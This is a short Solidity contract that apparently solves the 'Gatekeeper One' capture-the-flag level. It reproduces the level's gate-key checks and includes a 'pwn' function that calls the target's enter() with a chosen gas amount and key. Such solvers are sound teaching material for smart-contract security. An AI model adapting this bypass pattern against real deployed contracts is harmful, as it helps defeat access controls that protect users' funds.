// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneSolver {

	function verifyGateKey(bytes8 _gateKey) public view returns(bool) {
		require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
		require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
		require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
		return true;
	}

    function pwn(IGatekeeperOne _gate ,uint256 _gas, bytes8 _gateKey) public {
		_gate.enter{gas:_gas}(_gateKey);
    }	

}

interface IGatekeeperOne {
	function enter(bytes8 _gateKey) external returns(bool);
}